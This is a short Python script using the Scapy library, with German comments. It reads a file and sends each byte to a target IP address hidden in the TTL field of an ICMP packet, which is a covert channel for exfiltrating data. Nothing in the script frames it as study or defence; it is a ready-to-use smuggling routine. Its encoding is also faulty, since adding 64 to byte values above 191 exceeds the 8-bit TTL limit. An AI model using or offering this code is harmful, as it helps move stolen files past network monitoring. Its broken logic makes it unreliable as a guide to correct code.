from scapy.all import *

def send_data_via_ttl(file_path, target_ip):
    # Datei lesen und Inhalt in eine Variable laden
    with open(file_path, 'rb') as file:
        file_content = file.read()
    
    for byte in file_content:
        # Jedes Byte der Datei als TTL-Wert (+64 Offset) nutzen
        ttl_value = byte + 64
        # Erstellen und Senden des Pakets mit dem angepassten TTL-Wert
        packet = IP(dst=target_ip, ttl=ttl_value) / ICMP() # ICMP als Beispiel
        send(packet)
